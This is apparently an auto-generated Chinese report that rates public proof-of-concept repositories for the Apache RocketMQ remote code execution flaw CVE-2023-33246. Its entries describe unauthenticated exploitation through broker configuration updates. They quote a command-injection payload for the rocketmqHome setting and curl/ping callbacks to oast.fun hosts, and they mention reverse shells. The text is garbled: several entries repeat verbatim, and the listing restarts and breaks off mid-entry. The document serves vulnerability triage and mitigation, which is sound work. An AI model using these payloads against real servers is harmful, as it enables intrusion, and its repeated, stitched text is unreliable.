根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

